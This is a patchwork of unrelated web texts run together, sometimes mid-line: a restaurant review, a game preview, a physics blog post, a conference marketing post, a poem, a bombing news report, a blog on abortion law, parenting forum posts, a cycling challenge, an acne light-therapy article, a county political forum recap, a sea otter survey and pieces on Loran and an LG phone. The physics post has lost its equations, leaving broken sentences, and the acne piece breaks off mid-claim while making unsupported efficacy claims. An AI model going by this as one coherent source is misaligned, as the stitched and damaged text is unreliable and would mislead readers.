Snowgirl, I'm afraid I have to agree. I put off posting negatively because I have only been once, and I know how much Groovin and Denise like the chef. Nevertheless, my experience was last week at dinner with two friends. The place was bustling and we had great service. We decided to share bites of the ceviche, ahi tartare, squash bisque, and garlic burger. Two of us liked the ceviche, although Diane thought it was fishy. The problem was the pita chips, which were incredibly dry. My other friend said they must have been heated in a microwave. I agree, as we asked for some with the tartare; they arrived warm and supple and in a matter of minutes were dry and hard as rocks. The bisque was out of balance, perhaps too much uncooked curry powder (and I love the flavor of curry. This was just unpleasant). The burger was cooked to order, and the bun was fine. But, oddly, it was kind of cold. The fries were ample, but nothing to write home about. But the real disaster was the tartare. It was served basically unadorned, the color was not very fresh looking (although the fish was certainly fresh). The problem was that it had absolutely no taste. nada. Diane asked the waitress if there was something we could have to help it. We were brought the house vinaigrette, which did help. Price for this, a bottle of chardonnay, and a good tip was eighty bucks. Reasonably priced if the food had been better. I know I should give it another try, but I'll wait awhile.
- re: rooney
I also agree that the Acme Burger Company has been somewhat overrated by many of the posts here. The burger patties truly are good, but very little else about the place is gourmet or even terribly creative as far as I can see. I've had gourmet fries at many places, but they're pretty standard here, despite the gourmet prices. The beer list is fine but nothing special. At least one poster above likened this place to vegas - I agree. A hound on the strip has to pay at least 50% more for good proletarian food than he/she would in any other city. The prices are 50% too high here too. The ostrich burger is good but you need not charge more than $10 for it in Salt Lake City.Husky Men's Basketball Blog

For these games, and potentially for Shiren the Wanderer, many gamers have expressed themselves as follows: "Well, that looks like a cool game, but I don't like Rogue-like RPGs. They're all the same."
With that in mind, let me introduce you to ChunSoft's very first "Rogue-lite."
Shiren the Wanderer for Wii, technically Shiren the Wanderer 3 for those following the series, is the latest and greatest from ChunSoft's original IP. It garnered an impressive 35 out of 40 from Famitsu magazine and was praised by the Japanese community for making significant strides of progress compared to older Shiren titles.
To date, only one Shiren title has made it to America: a remake of the original SNES title, released on the DS as "Mystery Dungeon: Shiren the Wanderer" via Sega. Though I personally enjoyed the DS game, there's no question that people who are fundamentally opposed to Rogue-like RPGs would never be able to enjoy such a "hardcore" title as the original Shiren.
Shiren the Wanderer 3, however, is a new take on a tried-and-true subgenre. So before you write it off as "not your thing," check out the details to this upcoming title.
First and foremost, because I know this is on your mind, "What happens when you die?" Yes, you will lose the items you're carrying with you; anything you keep in a storehouse is safe though. As for leveling, your level penalty cannot lead to a "de-level." Compare that to the full start-over experience with Shiren DS (level 1 restart for every death), and what you get here is true RPG progress. With higher levels comes higher base strength and HP, so you can handle larger and more challenging dungeons.
Speaking of which, the dungeons in Shiren the Wanderer are now accessible via a world map. It is not fully linear; you choose where you want to go, and when you want to go back to town. Also, though the movement and action in dungeons is 1-to-1 grid-based, movement in towns and any non-combative zones is free.
Perhaps most intriguing aspect of Shiren the Wanderer is the AI. There are a variety of automatic settings you can give to Shiren and his partners. Typically, you will want to control one character (usually Shiren, but you have the option to control his teammates and allow Shiren himself to be AI-controlled). During certain areas, such as a tight dungeon room or a boss fight, you'll want to take advantage of the "full control" option. Here, you control everyone in the party (up to three members). They'll each get a turn, and then the enemies on screen will take a turn. Sometimes movement is fast and it feels like real-time action, even though everything is strictly calculated. At other times, you'll feel like you're entrenched in a turn-based strategy RPG. This level of flexibility should appeal to RPG fans of all stripes.
Aesthetically, the game looks and sounds to be one of the best Wii RPGs to date. The traditional Asian influence left a strong impression on me. Whether it's the fantastic score, co-composed by Koichi Sugiyama (Dragon Quest) and Hayato Matsuo, or the beautiful 3D animation is unsurpassed by pretty much any other JRPG for the Wii, I would say that thoughtful and observant gamers are in for quite the audio-visual treat when playing Shiren the Wanderer.
Atlus has Shiren the Wanderer scheduled for a February 9th, 2010 release. We'll follow up with a full review around that time. Until then, know that in place of getting the usual "Atlus spoils" (artbooks, soundtracks, etc.), Atlus is "passing on the savings" by setting this game at an MSRP of $39.99.Nima2
One of my favourite young physicists, Nima Arkani-Hamed, was in town today. He gave two talks.
One was about his work on spontaneously-broken diffeomorphism invariance. Specifically, consider a theory in which spatial diffeomorphisms are preserved, but time-translations are spontaneously-broken. There’s a scalar field which, in a really horrible pun, they call the ghostino, whose expectation value satisfies Expanding the field about its VEV,
under an infinitesimal diffeomorphism,
so transforms as a scalar under spatial diffeomorphisms, but transforms inhomogeneously under temporal ones, as befits a Goldstone boson. We also impose a shift symmetry under . The naive time-translation symmetry of a static spacetime is broken in this background, but the combination
is unbroken.
If you write out a general symmetry-breaking effective Lagrangian for (compatible with the shift symmetry and, for simplicity, with ), and expand it about a minimum, you find something like (after rescaling to give it a canonically-normalized kinetic energy)
The dispersion relation is a nonrelativistic one (unsurprising, since the symmetry-breaking has picked out a preferred Lorentz frame) and power-counting is a bit unconventional. should have mass dimension , should have mass dimension and should have mass dimension . The leading interaction term is
and is irrelevant in the infrared, so there’s a good perturbative effective field theory description.
Anyway, if you take eV, the coupling of this theory to gravity modifies gravity at cosmological distance scales, with interesting ramifications for cosmology.
There’s a bit of a swindle here, since the theory just described breaks down above the scale , and requires some ultraviolet completion there. However, if couples only gravitationally, they argue that it doesn’t really matter what the ultraviolet completion is. While there remains a challenge to embed this in a “real” theory, their effective Lagrangian analysis indicates that it’s not completely crazy to try to do so. You might not have expected it, but the long-distance physics makes sense.
Nima’s other talk was about “high energy” supersymmetry, some as yet unpublished work of his with Savas Dimopoulos, in which supersymmetry is broken at a relatively high scale and, of the superpartners, only the gauginos are light.
I’ll talk about that in more detail some other time…Posted by distler at April 28, 2004 1:14 AMHow to Create a Big Splash at a Huge Conference (SXSW 2010)by Grasshopper Team Published in Events, Marketing & Brands on
Being in the Buzz, Community, and Viral Marketing world one thing I have always struggled with is how to really get noticed at a big conference. Most recently was South by South West (SXSW), a technology, music, and film festival jammed into one, hosted every year in Austin, TX. In fact SXSW is so big that the technology industry nearly comes to a halt for a week. Even Peter Shankman (founder and writer of HARO) had his publisher send out the updates for him. That never happens!
We knew there would be 20k-30k tech entrepreneurs in the same place, but the question was “How do you compete with the Microsoft, Adobe, Kodak, AOL, and all the college students passing out free Zone Perfect Bars?” The only thing we knew was we didn’t want to give SXSW Incorporated $10-20,000 to have a boring booth or table.
What We Did
We wanted to create buzz for Chargify (the first company out of the Grasshopper Labs Division), as we knew our target customers were more technical than with Grasshopper.
First, we contacted FaceMakers Inc, who helped us design a custom mascot costume (see above). Then we nailed down a fun & central location in Austin to have a gathering. We (me as the matador and Charlie the Bull) spent the next 4 days running around (literally) the streets of Austin and the Convention Center interacting with everyone and anyone we could. “Interacting” is the key word here.
Have Clear Goals / Expectations
When being ridiculous and doing a big stunt you need to have clear goals in mind, otherwise you can easily find yourself losing focus and not gaining as much value as you originally hoped. We went into this knowing a few things:
We didn’t want to just hand things out
We didn’t want to sell anything
We wanted to have fun, and wanted people to have fun with us.
Hence everyone who proactively engaged or interacted with us was invited to our “secret” party on Monday where we had endless free beer & wine.
We wanted people to remember “The Green Bull & Chargify”
Throughout our trip we made sure whatever we were doing was helping advance one of these objectives.
Be Controversial
Controversy is interesting right? Why else would “Gilbert Arenas Gun” return over a million search results and “Tiger Woods Scandal” nearly 6 million? Believe it or not to a certain extent controversy can actually be intriguing and memorable. That is why our Bull and Matador gallivanted around the Austin Convention Center every single day, regardless of the fact that we were kicked out every single day. The final day by the police…whoops! But it made for a great photo opp.
Have Fun
One thing our CEO, Siamak Taghaddos said that stuck with me was “When it stops being fun, either change it up or do something else.” When you are having fun, people around you will as well…it’s just infectious. This theory was proven accurate last week at SXSW. We were having fun and as a result masses of people would proactively come up to us and want to engage us, take pictures, ask questions, etc.
Need the Right People (Passion + Knowledge)
It’s important to have the right people who can help you excel in the objectives you’ve previously identified. In this case we needed the following:
2 passionate and energetic young adults who were capable (and not easily embarrassed) of running around in costume for multiple days being loud / ridiculous.
1 of the 2 people (in this case the Matador) to be an educated company ambassador who could not only speak to the stunt, but the value added proposition of Chargify.
Memorable
On top of everything it’s important to make sure you are memorable. Because at the end of the day your hope here is that when people look back at SXSW 2010 they will think “Ha…remember Chargify and that lime green bull?” So what did we do outside of dressing up in a lime green bull costume you ask?
Our bull can do back flips…yes in costume. The local Austin news liked that one.
We played Four Square (literally the elementary school recess game) with the Four Square team.
We convinced Chevrolet to let us get in and have fun in their Corvette (huge success).
Oh yea and lastly…we were smiling the whole time, even our fearless mascot through the bull costume.

Autumn's Child is blessed with grace.
She will behold Jesus Christ, her Lord
and Savior face-to-face.
She posses the Holy Spirit's
own white dove love.
She sings to her beloved sweet psalms of
worship, praise and love; honoring
her Savior, Lord, and King!
His daughter's being born again;
her eternal journey will never
come to an end.
She will humbly kneel before His
heavenly throne: as Hew welcomes her
into her eternal home.
'Well done, my good and faithful servant, '
He will say on that memorable day.

A total of 68 people were injured in the blast near a police station in southeastern Turkish province of Gaziantep on Monday night, four of them in critical condition, Turkish Deputy Prime Minister Besir Atalay told reporters on Tuesday.
Most of the others suffered slight injuries caused by shattered glass, said Atalay, adding that Monday's blast set several vehicles ablaze.
"The vehicle used in the attack was a stolen one. It was brought to the site of the blast by a tow truck, with a high amount of explosives on board," Atalay said.
"We made significant progress in finding those responsible for the blast," he said.
The blast came amid an escalation of clashes between the Turkish security forces and the PKK. In the last two months, the PKK has intensified its attacks including kidnapping a lawmaker, launching attacks in the western parts of the country and targeting civilians in different towns.
However, the PKK denied carrying out the bombing attack in a statement published by the pro-Kurdish Firat News agency.
"Our forces have nothing to do with this attack. We do not attack civilians," the PKK said in the statement.
The deadly attack is likely to further strain the already tense relations between Turkey and its neighbor Syria as Turkish officials indicate collaboration of the PKK and the Syrian regime in the incident.
Syrian President Bashar al-Assad's attitude to the PKK is "the enemy of my enemy is my friend," Huseyin Celik, deputy chairman of the ruling Justice and Development Party (AK Party), told Daily Hurriyet Tuesday.
In a written statement, Pro-Kurdish Peace and Democracy Party ( BDP) condemned Tuesday the attack against civilians in Gaziantep and advised the Turkish government to change its policies on Syria, implying that the attack was connected with the developments in Turkey's neighbor.
The PKK, listed as a terrorist organization by Turkey and most of the international community, took up arms in 1984 in an attempt to create an ethnic homeland in southeastern Turkey. Since then, over 40,000 people have been killed in conflicts involving the group.
Turkey, once a close ally to Syria, has imposed a series of sanctions, including an arms embargo, on the unrest-torn country due to its alleged crackdown on anti-government protesters. The Turkey-Syria relations strained further after Syria shot down a Turkish military jet, which crashed into the Mediterranean Sea in June.

After the six-time UFC champion Randy Couture steps into the octagon for the last time this weekend, his career as a successful Las Vegas businessman will still be in full.In January, we linked to a series that was being kicked off by The Morning News, in which writer Todd Levin would recount the story of his life through the various gaming console's he's owned. It was good, good reading. Well, it just wound up, so now's as good a time as any to link to it again, particularly seeing as he spends half the final chapter dwelling on the same love/hate relationship with this site that we have to fight through every goddamned day while we sip cold coffee, alone, and wonder why the hell we quit our part-time gigs in the video games department of Best Buy to work this dead-end beat. Second Place is First to Lose [The Morning News]
The End Of A Man's Story, Told Through His ConsolesOn the eve of the 41st anniversary of Roe v. Wade, the Supreme Court’s landmark ruling on abortion, constitutional law and gender issues expert David S. Cohen joined MSNBC’s “Melissa Harris-Perry” show for a discussion about the embattled issue of reproductive rights.
Time for Offensive in Fight Over Choice?
In the first segment, Cohen, along with University of Pennsylvania Professor Anthea Butler, Center for Reproductive Rights President Nancy Northup and GOP consultant Katon Dawson, discussed the impact of the Supreme Court ruling in Planned Parenthood v. Casey.
The panel examined the strategy from mostly Republican-led legislatures and discussed whether this might be the turnaround point in the battle over reproductive health services.
When asked whether Roe v. Wade was a sufficient decision to continue to rest reproductive rights on, Cohen said: “Roe had promise but the problem was that it was cut back in Casey in 1992, the Supreme Court case that allowed a lot more restrictions from the state. [Casey] was basically the Supreme Court saying that you can do things that are burdensome on women’s rights as long as they’re not unduly burdensome.”
“Ever since Casey, we’ve seen the Court and lower courts be more receptive to infringements on women’s rights and women’s access to abortion,” he said. “Casey has really opened up the floodgates…it’s really troublesome what Casey has allowed.”
Why 35 Feet is So Critical
In the second segment, Cohen discussed the importance of buffer zones, as the Supreme Court mulls a Massachusetts law that limits protesters’ access to abortion clinic entrances.
Buffer zones that require protesters to keep a specified distance from women’s health clinic entrances are critical to protecting patients and care providers from harassment and worse, Cohen said.
Doctors and other clinic workers and volunteers face threats on a daily basis, said Cohen.
Dangers have been keenly felt in Massachusetts, he.
Reproductive Rights Supporters Get NC Victory
Finally, the panel discussed a recent federal court ruling that struck down a North Carolina law requiring ultrasounds on the program. The judge ruled that the law was a violation of free speech.
How did this law violate the First Amendment?
“In this regard, it’s telling doctors what to say and it’s infringing on the doctor-patient relationship,” Cohen said. “Because if a doctor says that I can treat this woman and I can ensure her health in a particular way, and the state is saying you have to do something different, then that’s an infringement on that relationship.”
“It goes beyond that, though,” he said. “It’s also about the state saying, ‘We know what’s best for women. Women don’t know what’s best for women, doctors don’t know what’s best for women, counselors don’t know what’s best for women, but we, the legislators, do.’ [These legislators] have probably never been in an abortion clinic, never been pregnant – and can’t even get pregnant, because most of them are men.
“It’s really women who know what’s best for women, in consultation with their doctors and whoever else they’re talking to.”
About David S. Cohen
Cohen is an associate professor in Drexel University’s School of Law. His scholarship explores the intersection of constitutional law and gender, emphasizing sex segregation, masculinity and violence against abortion providers. He also researches voting anomalies in the Supreme Court.
Cohen recently completed a groundbreaking national study about the toll that working under the constant threat of violence takes on abortion clinic workers. He is writing a book on this subject which is due out later this year from Oxford University Press.
Members of the news media who are interested in speaking with Cohen, can contact Alex McKechnie at 215-895-2705 or ahm62@drexel.edu.
Sarah Greenblatt contributed to this blog post.
David Cohen’s forthcoming book about the stresses felt by abortion clinic staffers promises to be a valuable contribution to the subject, as these women (and some very few men) are brave and caring “soldiers” in a Good Fight to help preserve the right of human beings to have agency and say where their bodies and health (mental and physical) is concerned. Related attention is owed the males in a clinic waiting room, and much can be learned about them at, a web site I co-sponsor with a retired clinic director, Claire Keys. My own work here is available in Men and Abortion: Lessons, Losses, and Love, which I wrote in 1984 with two others when a Drexel Professor. I hope to bring out a new version in 2015.
Slaughtering children is stressful work, I’m sure.

..................
confession time:
now don't tell anyone, but i can be a super-over-bearing perfectionist-seeker of a mommy!
i know, you're probably not shocked, right sweeties? :)
we all want the best for the children in our lives.
i do too.
but sometimes i'm a meddling mommy.
i want to involve myself in every step of every project to make sure it's as perfect as perfect can be.
i'll admit: that's not always helpful. :)
so here's a proud mommying moment (and handmaking life lesson) i wanted to share with you all...
............
so little rikrak had a fun school project last month: the pioneer farm.
- first there was lots of adorable research. (think supercute little-one handwriting!)
- then trips to various hands-on sites. (feeding cows, visiting pioneer barns, touching great great great great grandfather-made tools. splendid!)
- then an essay rough copy. edit. & good copy.
- then practicing a fun interactive presentation.
- then building a beautiful model.
through all of it... i wanted to get my mommying 2-cents worth in. but the best lesson of all for me? as tough as it might be, let your little ONE shine!
if you've ever been privy to a child working on a project, i think we can all agree... it's VERY tempting to try and lend a hand (or lend many hands!) , especially as obstacles arise.
but i had personally decided to be the most hands-off, support from the side kinda helper i could be for this project. i could see the excitement in little rikrak's eyes as he brainstormed fabulous idea after fabulous idea, many of which i couldn't have thought of.
we all have our own fabulous perspectives, don't we?!
needless to say i'm over the moon proud of little rikrak's hard work and creative figurings on his latest life project.
and just look at this wonderful DIY model!
the cute handcut bales of hay.
the fun pipe cleaner oxen yoke.
the handmade, not factory-made or mommy-made wonderfully child-drawn marker lines on the barn roof.
he MADE that.
what joy there is in that sentiment, for each of us!
many a time i wanted to get in there and "fix" or "alter" or "adjust" something.
BUT i KNOW there is great learning, and beauty, in the handmade. "imperfections" and all.
it's a value our family shares deeply.
sometimes my quest for perfection as a mommy invades that ethic.
i struggle with it.
i know some day we'll have to dismantle this fabulous model (unless we can build a *museum for everything little rikrak has handmade* 3rd floor addition to our home! mr.rikrak?)
but for now i just look at it all day on my desk and smile.
and best of all: the pride on his face for a project he handmade. that's a wonderful thing, indeed!
isn't it magical when little ones work hard, overcome challenges and see a project thru with vim & vigour.
well done, sweetie pie. i'm so proud of you.
(and don't you love the open-up barn roof and removable hay loft? makes for hours of fun playing, let me tell you!)
did i tell you how i FORCED us to watch little house on the prairie episodes as bonus *research?* LOVE IT!
tell us something you're proud of in your little ones' lives.
how do you step back and let the little ones in YOUR life shine?
yay to handmade families.

We need work on this at our house. My partner is good at "guide at the side" but I'm terribly invasive!!!! LOL!
I find literally stepping back helps me gains the perspective needed. ;>
Maria
ah thanks for your support, sweetie! :)
great idea about *stepping back!*
i'll try it next time for sure! :)
hugs
I have a 2 year old and have to check myself *all the time* to stop myself from meddling and helping him when he is doing just fine figuring something out on his own! It's about giving him the time to do that.
I hate to see him get frustrated, so it's hard to stay back sometimes. Luckily he can now talk quite well and says, "mummy no help" and "M do it by himself" if I overstep the mark!
so true, suki. he's lucky to have your lovely attention! :)
bravo, you, it looks absolutely fabulous, I bet he was so so thrilled and proud!!! yay for the Rikrak family and new learning and exploring! we need to remember, as adults, that it`s ok to explore, with no need for perfection. a great reminder, thanks lady!The diaper bag fairy...uggh DH!
Ack, so frustrating!
We had Venice's birthday party at my house and because I'm working now I had to do all the prep the night before and the day of the party. The day of the party I sent the kids up and still had to go up and wake him up to help out. I took the baby to the grocery store with me to give him room to get things done and told him the kids HAD to be fed breakfast while I was gone so he would get moving. My plan was to bring the groceries in and start cooking/ prepping. Well in that 30 minutes he made them a real breakfast with sausage, eggs, what have you. Made a huge mess across the entire kitchen, dirtied all the pots I needed to use to prep the food, and the house smelled like sausage.
So I was mentally going through my list and freaking out on the way home, then walk in to a huge mess, and my Sylvie walks over covered in toilet paper "Mom I'm a zombie." My mom had called so I was on the phone and basically cut her off - Mom I don't have time for this! There are zombies and messes and I have a party in a few hours!"
And then, I did all the party prep holding the baby and he started "cleaning" by wiping down all the electronics. Because cleaning the ipads is sooo crucial to the party right? AAAAAAAHHHHH.
To his credit he figured out how to get my montage for the baby from the computer to the tv in a matter of minutes. I guess I'll keep him around!

I am not alone, sometimes i think i have an additional child. My DH pays attention to nothing....i would be scared to leave him with DD without a written set of instructions marked down to the time each thing had to happen.

Leaving on a business trip today - my first since having LO. I have written instructions and stuck them on the fridge for my DH. There's a diaper bag instruction, a what to feed how and when instruction and a general wake, eat, sleep schedule. He'd be so lost without me! lol
my DH is a good dad, loves our son, plays with him, does bath time. but ive never left him alone with LO for more than 2-3 hours lol i come home and hes frustrated and this is after he has called a few tmes with questions. i chalk it up to im kind of picky, and do a lot more than i have to so he doenst get the chance. plus im home all day with LO so in this stage of his life i just know a bit more of whats going on. also, someitmes my DH will just wing it and not ask and sometiems thats worse than a lot of questions! lol

In the week which starts on Bastille Day (14th-21st July), Rapha is challenging participating riders to climb the combined height, from sea level, of the Peyresourde, Ventoux and Col de Sarenne, all of which feature in this year’s race. The Peyresourde is one of the giants of the Pyrenees, which featured in the Tour's first excursion into the bear-infested mountains in 1910, while Mont Ventoux, the Giant of Provence, first appeared in the Tour in 1951, a year before Alpe d'Huez. Together, they've been the sites of some of the Tour's most famous battles. The Col de Sarenne, however, has never been scaled in the Tour. It’s a little known col, 1,999m high, that the pros will climb this year, having first climbed the Alpe. Descending on a road resurfaced especially for them, they will loop back round to the foot of the Alpe to make that climb again.
Just as the pros will have to scale Alpe d’Huez twice, Rapha is challenging riders to scale the Alpe once more, making a total climbing distance of 7,235m, the combined elevations of the Peyresourde, Ventoux, Sarenne and Alpe d’Huez from sea level to top.
Cause last years hurt enough...
To celebrate this amazing race and ensure you spend as much time riding outdoors than you do watching each day's stage, Strava and PowerBar are challenging you to ride half the distance of the 2013 Tour de France in 33 days. This 1,680 kilometer Challenge starts on the first day of the race (June 29th) and ends ten days after the winner is crowned (July 31st).

Blue light therapy for acne can reduce up to 60 percent of your acne. If you combine blue light therapy with traditional treatments, such as prescription creams and antibiotics, you can keep your acne completely under control. The best thing about it is that it’s a natural treatment that basically kills Propionibacterium acnes (P. acnes), the bacterium that causes acne inflammation. It’s also completely painless.
These therapies can also improve skin texture and lessen the appearance of scars, so they may be good treatment choices for people with both active acne and acne scars.
How Does Blue Light Therapy Work and Is It Proven Scientifically?
To put it simply, it has been proven that blue light therapy for acne –”.
Remember: P. acnes multiply very fast, so ongoing treatment is necessary for best results.
Blue Light Therapy for Acne – Tabletop Device or Handheld Device?
Tabletop light therapy devices usually require 10-15 minutes of treatment once a day and you have to sit very close to the device. Handheld devices require you to hold the device directly on the acne areas for at least 30 minutes – twice a day. Obviously hand held devices are cheaper than the tabletop devices and it really depends on how much time and patience you have for your self treatment.
Side Effects and One Important Warning
Possible side effects of blue light therapy include temporary redness and dryness in the treated areas, but these are only temporary. The level of UV light in these devices is also very low and appears to be well within the range of safety.
Warning: One type of acne that does not respond well to blue light therapy, and which may actually worsen as a result of treatment is called nodulocystic acne. Don’t use this therapy if you have this kind of acne.

Last Updated: 3/17/2015I attended last night’s local Political Forum in the Old Renovated Harrison County Courthouse! This was my first Political Forum to attend here in Harrison County and I enjoyed hearing from candidates from 3 contested races.
District Clerk
Sherry Griffis
Mellinda Craig
County Court at Law
Jim Ammerman
Rick Hurlburt
District Attorney
Joe Black
Coke Solomon
(BTW if you wondered I listed the Incumbent first and all are Democrats the Challengers are Republicans)
Overview:
My impression of the venue, the setting and the hosts. My sincere appreciation to the League of Women Voters, while I was apprehensive from seeing the information online regarding their strong support of the Universal Health Care law and the Climate Change legislation that was pending in Congress and in general about the League, I can say with a certainty that the our Marshall/Harrison County League conducted themselves in a fine fashion in hosting a fair, balanced and productive Forum for the Candidates and the public to hear the candidates first hand and meet them in person.
The venue in the Renovated Harrison County Courthouse was wonderful and had room for about 150 guests I would estimate possibly a little more counting the second floor, I didn’t gaze up there but believe the main floor was more than 90% full during the opening of the Forum, in fact several late comers started by standing at the back, although later everyone found an available seat! I have to say the Dome and Interior have been well done, not that I’m surprised the renovations completed by Sloan construction that I have seen, including ETBU’s Marshall Hall, ETBU’s Scarborough Hall and now the County Courthouse doesn’t lead me to doubt that they do fine renovation work.
Now to the Candidates and the Forum:
The procedure was set with an Opening from each candidate as determined by numbers drawn from a hat, the lowest number went first. The First Speakers were Candidate Rick Hurlburt, Candidate Coke Solomon and District Clerk Kathy Griffis. After the opening remarks were completed, the Candidates received pre-selected questions that had already been sent to the Candidates from the League of Women Voters. After this the Candidates received several questions from note cards in the Audience.
To the Races:
County Court at Law
Incumbent Judge Jim Ammerman was polished and judicial in his speech and opening remarks, although some of the remarks from Candidate Hurlburt did cause defensiveness in the Judge.
From my observations I saw Judge Ammerman clearly present his desire to continue serving Harrison County for the good he has done in the Juvenile Courts. He mentioned several achievements including re-starting a Juvenile Boot Camp, Teen Mentoring, Partnerships with the local Police and Schools to encourage Juvenile offenders to not repeat their past mistakes and get help. In addition to this he portrayed his strong support of involving all Custodians and Parents of Juvenile defenders to attend and complete mandatory Parenting classes and improvement steps as set by his Court. He pointed out that Juvenile Crime has dropped 56 percent since he took office. The points that he mentioned about his opponent seemed to center on Candidate’s Rick Hurlburt’s career as a Criminal Defense Attorney, especially in defending criminals accused of drug offenses. I didn’t find this remark particularly helpful or pertinent to his case to Re-Elect him. I particularly believe that the Defense Attorney has the obligation and requirement of providing the best possible defense in all cases no matter how heinous, the facts I believe will come out and if Attorney Hurlburt did not argue the accused criminal’s past suffered abuses then he would have been negligent in his duties. In addition to this the most defensive Judge Ammerman seemed was about the “Case Backlog” that Candidate Hurlburt mentioned of 1200 or so cases. Judge Ammerman did a fair job in assessing the cases and explaining the fact that 87 defendants had not been apprehended and therefore the cases were inactive and impossible to move. There were an additional 800 cases that were “inactive” however, Judge Ammerman didn’t explain how he came to that conclusion on those files outside of the “State has changed reporting requirements” From the reduction in Juvenile crime and the implementation or re-activation of several Youth oriented programs it would seem Judge Ammerman has not only been an Advocate for Justice but for an improved Juvenile system overall.
Candidate Rick Hurlburt
Candidate Hurlburt came across with 3 central points to his message. The first overall theme was that he had the experience and desire to serve Harrison County. He had been a Court Judge in Longview until recently when the City Charter was reviewed and it was discovered that He as a Resident of Harrison County was in-eligible to serve as Judge in that Court.
In addition to his experience on the bench Attorney Hurlburt has many years as a practicing Criminal Defense Attorney, a Prosecutor and 4 years experience in Law Enforcement as a Kilgore Police officer. Candidate Hurlburt made his main premise the Part time manner in which the County Court at Law Judge currently services Harrison County is inadequate and has lead to backlogs. Candidate Hurlburt indicated that the ability to have a continuing law practice by a sitting judge is an only exception for Harrison County that Judge Ammerman uses to continue his personnel practice here in Marshall. To accentuate this point he then brought up the backlog of cases before Judge Ammerman’s court and mentioned the Clerk had reported to him about 1200 cases currently in back log. As I mentioned above you can see Judge Ammerman’s responses to that charge. The third leg of Candidate’s premise for his Candidacy for County Court at Law was the Zero Tolerance Issue at MISD. Attorney Hurlburt believes a True Zero tolerance policy is a travesty for the young people in Marshall and places the blame upon the victim in an altercation. Judge Ammerman says that MISD doesn’t have a Zero Tolerance policy. I plan on asking Marshall High School’s Principal Sunday as long as he’s there at my Sunday School class. I’m sure I’ll be informed correctly then and I’ll let you know what I find out.
The final premises for Rick Hurlburt’s candidacy focused on the detention of Juvenile offenders without a ruling, I didn’t follow all of the legal areas that Attorney Hurlburt was making but it seemed to be summed up that Judge Ammerman had not been fully ruling according to Texas Statues in regards to Juvenile detention which allowed them to be detained for up to 2 weeks until a determination regarding the case could be made and a ruling as to a finding of fault. Candidate Hurlburt also mentioned that there several hundred cases that Judge Ammerman had issued “Abatement” orders upon which disposes of them when they are inactive without a finding or completion from the Court.
Well for the first Forum candidates I though Candidate Hurlburt came off a little ahead of Judge Ammerman, but I really think he would have carried the forum by continuing to focus on the 56% reduction in Juvenile crime and the strong Community and Young Offender mentoring and re-education support he has given Harrison County over the past 12 or so years. In all it was a great exchange and I plan on finishing the other races in the next couple of days.

Marshall News Messenger’s Story of the debate: marshallnewsmessenger.comThe sea otter population at the Kenai Fjords National Park appears stable, according to aerial surveys taken in June.
A United States Geological Survey study estimated that 1,322 sea otters live within the park's boundaries. Alaska Biological Science Center zoologist George Esslinger, who headed the survey, said that the total is around 200 fewer than the last go round, three years ago. He believed that the margin of error may have caused the dip.
The $3,680 otter survey is part of the park's near shore ecosystem study. The park took a look at the mammals because they act as a measurement of the environment's overall health.
Esslinger said that otters feed on sea urchins, clams and various shell fish throughout the park's bay area. These species feed on kelp beds, and increased predation on the part of the otters puts less stress on kelp habitats, which causes them to flourish. Fjords Park Natural Resources Manager Fritz Klasner said that salmon and herring shelter in the kelp beds in the bay.
Esslinger said that USGS flew over specific areas of the bay and counted the otters. The numbers were multiplied over the Fjords bay area to estimate their population. The report is undergoing review and will be published in about a month, according to the zoologist.
Although sea otters don't venture too far from their primary living area, Esslinger said that there could be a number of transient species.
"It's not a closed population. They can come and go," he said.
The near-shore study gives resource managers a better idea of recent changes in the ecosystem. The park has little jurisdiction over the water, according to Klasner, but asks boaters to drive carefully they see otters. The mammals have no blubber, according of the federal wildlife service, and must spend at least half the day resting or risk losing insulating fat cells. Human disturbances draw otters attention and can cause them to leave the area for more secluded grounds.
Klasner recommends that boaters yield to otters and minimize the vessel's wake, especially around mother's with nursing pups.
Major Marine Tours Seward manager Eric Bilyou said that half of his customers ask about the otters, and the mammals appear in almost every single captain's log. Most people want to see other things though.
"It's usually glaciers, whales and shorebirds," he said.
Unlike otters in the Aleutian Islands, their counterparts in the Fjords rest on the beach, said Esslinger. The Aleutian otters populations have withered by up to 90 percent in recent history, according to the US Fish and Wildlife Service. The zoologist said that the remaining otters are much more skittish and don't rest in the open.
Fur traders hunted otters to near extinction until the International Fur Seal Treaty of 1911 banned indiscriminate hunting of the species.

The big question today ‘’who invented the internet’, notwithstanding Al Gore’s claim, there is no question of who invented the ‘solid state’ Loran transmitter, at its core the innovative ‘magnetic (Loran) pulse (forming and shopping) compression technology. Dr Paul Johannessen founded the company Megapulse (1970) to exploit the technology breakthrough and apply it to the network of legacy ‘tube type’ Loran transmitters. After thorough vetting and exhaustive validation tests, 4 years in the making, the technology was approved (1974) as the technology of choice under a USCG initiative and modernization program; and mandate to provide Loran coverage and with it PNT services to the US maritime and timing communities. The mandate extended to GA with the closure of the mid continent (Loran) gap in 1986. Clearly, Paul’s achievements rest on the prior work of other, that had its beginning at the newly formed MIT radiation Lab in 1940, and recognized as a major (one of four) milestone at a recent (June 2012) IEEE Milestone in Electrical Engineering and computing awards presentation by the IEEE Boston chapter. Nevertheless Paul’s unique achievements, in the process of discovery and invention, was a major contribution to the development of a stable and reliable National Loran Network, in the US; and worldwide. Paul’s fertile mind extended the vision and applied the necessary resources to develop and to make the Loran network the terrestrial equivalent of GPS or as a backup absent GPS. Erik Johannessen, President of Megapulse accepted the honors on behalf of the Loran communities, provided the historical context in the development of the technology and spoke of the splendid collaborative effort of the many to deliver important (new) capabilities in the design and development of the ‘next generation’ eLoran PNT&C equipment and services to make Paul’s vision reality.

They have a few Android phones out or on their way, and they've already released the Optimus Pad aka G-Slate on T-Mobile and that was their first tablet. For now most of the upcoming phones like the LG Revolution all sport the andy standard 800x480 resolution, so could this be a new 4, or 4.5" high-res phone in the works, or possibly a 7" Android 3.1 Honeycomb tablet, we don't know but it looks to have the makings for a phone.
From past devices by LG we have a pretty good indication that this will in fact be a phone. The Optimus 2x internal model number was the P990, the G2x was the P999, then you have the LG Optimus Black P970, and many others like the Optimus 3D named the P920. When you look at tablets the LG Optimus Pad name or model number was the V900. So it is safe to say phones start with P, while slates or tablets will probably all start with V.
From the information in the XML file, and from our sources we do know that the P930 will be an Android device with a 1280 x 720 display, and brings with it GPRS/EDGE and HSDPA/HSUPA connectivity. Taking all of that into account with the P930 name it looks like we have a sweet 1280x720p LG phone in the works. Sounds like the iPhone 4 and upcoming qHD display phones will have something to look up to soon, that will be the P930 and any other phone with this high-res screen. We have recently heard about Toshiba having the same resolution on a 4" display so this might be the same size, or something bigger. We don't know much for now but feel free to look over the XML file.

